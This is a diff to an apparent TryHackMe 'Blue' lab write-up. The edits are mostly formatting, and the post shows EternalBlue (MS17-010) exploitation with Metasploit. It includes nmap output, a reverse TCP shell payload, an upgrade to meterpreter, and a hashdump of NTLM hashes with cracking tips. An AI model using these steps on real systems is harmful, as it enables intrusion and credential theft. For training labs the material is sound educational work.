@@ -6,17 +6,15 @@ categories:
   - TryHackMe
 ---
 
-<img src="Blue.gif" width=200 height=200 alt="blue">
+{{< post-img src="blue.gif" alt="blue" style="width: 200px;" >}}
 
-This is actually one of my favorites rooms 
+This is actually one of my favorites rooms
 
 It is a guided room initiation to eternal blue exploitation
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 nmap -sV -sC -vv 10.10.167.119 -Pn
 ...
 
@@ -63,7 +61,7 @@ PORT      STATE SERVICE            REASON  VERSION
 Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| p2p-conficker: 
+| p2p-conficker:
 |   Checking for Conficker.C or higher...
 |   Check 1 (port 51387/tcp): CLEAN (Couldn't connect)
 |   Check 2 (port 17757/tcp): CLEAN (Couldn't connect)
@@ -71,8 +69,8 @@ Host script results:
 |   Check 4 (port 54355/udp): CLEAN (Timeout)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
 |_clock-skew: mean: 1h32m40s, deviation: 3h00m00s, median: 2m39s
-| smb2-security-mode: 
-|   2.1: 
+| smb2-security-mode:
+|   2.1:
 |_    Message signing enabled but not required
 | nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:94:f0:59:6b:d5 (unknown)
 | Names:
@@ -86,17 +84,17 @@ Host script results:
 |   02 94 f0 59 6b d5 00 00 00 00 00 00 00 00 00 00 00
 |   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 |_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
 |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
 |   Computer name: Jon-PC
 |   NetBIOS computer name: JON-PC\x00
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2022-01-19T13:11:05-06:00
-| smb2-time: 
+| smb2-time:
 |   date: 2022-01-19T19:11:05
 |_  start_date: 2022-01-19T19:06:21
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
@@ -107,7 +105,7 @@ Look at those `smb ports` open...
 
 If you used `--script vuln` option with nmap as suggested you get this
 
-```
+```bash
 PORT      STATE SERVICE       REASON
 135/tcp   open  msrpc         syn-ack
 139/tcp   open  netbios-ssn   syn-ack
@@ -115,25 +113,25 @@ PORT      STATE SERVICE       REASON
 3389/tcp  open  ms-wbt-server syn-ack
 
 |_ssl-ccs-injection: No reply from server (TIMEOUT)
-| rdp-vuln-ms12-020: 
+| rdp-vuln-ms12-020:
 |   VULNERABLE:
 |   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
 |     State: VULNERABLE
 |     IDs:  CVE:CVE-2012-0152
 |     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
 |           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
-|           
+|
 |     Disclosure date: 2012-03-13
 |     References:
 |       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
-|   
+|
 |   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
 |     State: VULNERABLE
 |     IDs:  CVE:CVE-2012-0002
 |     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
 |           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
-|           
+|
 |     Disclosure date: 2012-03-13
 |     References:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
@@ -148,7 +146,7 @@ Host script results:
 |_smb-vuln-ms10-054: false
 |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
 |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
-| smb-vuln-ms17-010: 
+| smb-vuln-ms17-010:
 |   VULNERABLE:
 |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
 |     State: VULNERABLE
@@ -156,7 +154,7 @@ Host script results:
 |     Risk factor: HIGH
 |       A critical remote code execution vulnerability exists in Microsoft SMBv1
 |        servers (ms17-010).
-|           
+|
 |     Disclosure date: 2017-03-14
 |     References:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
@@ -170,7 +168,7 @@ Then fire up metasploit for easy access
 
 you can search for eternalbue if you didnt find the metasploit path on google already
 
-```
+```bash
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > options
@@ -211,13 +209,13 @@ I suppose you already know metasploit so I wont insult you by showing all steps
 
 For academic reasons we change the payload from automatic meterpreter to a simple shell
 
-```
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
 payload => windows/x64/shell/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 [-] Handler failed to bind to 10.8.226.203:4444:-  -
-[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] Started reverse TCP handler on 0.0.0.0:4444
 [*] 10.10.167.119:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
 [+] 10.10.167.119:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
 [*] 10.10.167.119:445     - Scanned 1 of 1 hosts (100% complete)
@@ -228,7 +226,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [*] 10.10.167.119:445 - CORE raw buffer dump (42 bytes)
 [*] 10.10.167.119:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
 [*] 10.10.167.119:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
-[*] 10.10.167.119:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[*] 10.10.167.119:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
 [+] 10.10.167.119:445 - Target arch selected valid for arch indicated by DCE/RPC reply
 [*] 10.10.167.119:445 - Trying exploit with 12 Groom Allocations.
 [*] 10.10.167.119:445 - Sending all but last fragment of exploit packet
@@ -250,7 +248,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [*] 10.10.167.119:445 - CORE raw buffer dump (42 bytes)
 [*] 10.10.167.119:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
 [*] 10.10.167.119:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
-[*] 10.10.167.119:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[*] 10.10.167.119:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
 [+] 10.10.167.119:445 - Target arch selected valid for arch indicated by DCE/RPC reply
 [*] 10.10.167.119:445 - Trying exploit with 17 Groom Allocations.
 [*] 10.10.167.119:445 - Sending all but last fragment of exploit packet
@@ -273,7 +271,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 Shell Banner:
 Microsoft Windows [Version 6.1.7601]
 -----
-          
+
 
 C:\Windows\system32>
 
@@ -284,7 +282,7 @@ We are in!
 
 background that session (note the number...2 for me) and use `shell_to_meterpreter` for escalation
 
-```
+```bash
 C:\Windows\system32>^Z
 Background session 2? [y/N]  y
 msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
@@ -308,7 +306,7 @@ msf6 post(multi/manage/shell_to_meterpreter) > run
 [*] Upgrading session ID: 2
 [*] Starting exploit/multi/handler
 [-] Handler failed to bind to 10.8.226.203:4433:-  -
-[*] Started reverse TCP handler on 0.0.0.0:4433 
+[*] Started reverse TCP handler on 0.0.0.0:4433
 [-] Powershell is not installed on the target.
 [*] Command stager progress: 1.66% (1699/102108 bytes)
 [*] Command stager progress: 3.33% (3398/102108 bytes)
@@ -320,16 +318,17 @@ msf6 post(multi/manage/shell_to_meterpreter) > run
 [*] Upgrading session ID: 2
 [*] Starting exploit/multi/handler
 [-] Handler failed to bind to 10.8.226.203:4433:-  -
-[*] Started reverse TCP handler on 0.0.0.0:4433 
+[*] Started reverse TCP handler on 0.0.0.0:4433
 [*] Post module execution completed
-msf6 post(multi/manage/shell_to_meterpreter) > 
+msf6 post(multi/manage/shell_to_meterpreter) >
 [*] Sending stage (175174 bytes) to 10.0.2.2
 [*] Meterpreter session 3 opened (10.0.2.15:4433 -> 10.0.2.2:49224) at 2022-01-19 20:43:48 +0100
 [*] Stopping exploit/multi/handler
 
 ```
 I get my meterpreter on session 3
-```
+
+```bash
 sessions 3
 [*] Starting interaction with 3...
 
@@ -346,7 +345,7 @@ nt authority\system
 ```
 Good! we got privileges! Let's migrate to a better process
 
-```
+```bash
 meterpreter > ps
 
 Process List
@@ -402,28 +401,26 @@ meterpreter > migrate 2900
 
 ## post-exploitation
 
-Its looting time! dump some informations!
+Its looting time! dump some information!
 
-```
+```bash
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 
-
 ```
-Cracking time! 
+Cracking time!
 
 Those are windows NTLM hashes! even crackstation get this done
 
-alternatiely we can use john or hashcat (mode 1000) with rockyou.txt
-
+alternatively we can use john or hashcat (mode 1000) with rockyou.txt
 
 For flags just look in classic locations
 
 The root...okay its not so classic but always check here
 
-```
+```bash
 meterpreter > shell
 Process 2648 created.
 Channel 1 created.
@@ -458,7 +455,7 @@ The SAM database store juicy info and passwords (it can be dumped too)
 
 Its in system32 folder (config subfolder) so be cautious moving there
 
-```
+```bash
 C:\Windows\System32\config>dir
 dir
  Volume in drive C has no label.
@@ -492,7 +489,7 @@ And obviously...the Users folders
 
 Flags are usually here in Desktop or Documents subfolders
 
-```
+```bash
 C:\Users\Jon\Documents>dir
 dir
  Volume in drive C has no label.
@@ -518,6 +515,4 @@ I like the cool name (like shellshock and heartleed...cool vuln names)
 
 you can read more about it and learn how it led to the `wannacry` disater
 
-
-
-
+{{< post-img src="blue.png" alt="eternal-blue" style="width: 200px;" >}}
